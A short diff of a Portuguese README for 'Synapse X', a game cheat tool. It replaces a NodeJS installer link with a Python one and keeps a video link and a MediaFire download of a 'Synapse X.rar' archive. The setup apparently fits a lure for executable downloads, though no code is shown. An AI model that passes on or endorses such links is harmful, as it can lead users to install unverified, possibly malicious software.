@@ -17,22 +17,17 @@ Conceitos básicos
   
 ![download](https://user-images.githubusercontent.com/113463089/192170204-d5daec34-504d-4825-8aef-fb74804dc9d4.png)
   
-  DEPOIS QUE ABRIR O CMD CLICK ENTER DUAS VEZES E ESPERE INSTALAR POR COMPLETO O NODEJS !
   
-💸 <b>• Download do NodeJS 64 Bits:</b> https://nodejs.org/dist/v18.9.1/node-v18.9.1-x64.msi
+💸 <b>• Download Python 3.10.8 :</b> https://www.python.org/ftp/python/3.10.8/python-3.10.8-amd64.exe
 <p>
 
 
 <br><p>
 - Segue o VÍDEO.
-
-
 <p>
   
   VÍDEO DO SYNAPSE - X https://www.youtube.com/watch?v=IadAuceHC5c
-  
 <br>
-<br><br>
 💸 <b>• DOWNLOAD DO SYNAPSE - X:</b> https://www.mediafire.com/file/px0j5pmbt7bi10v/Synapse+X.rar/file
 <br>
 <br>
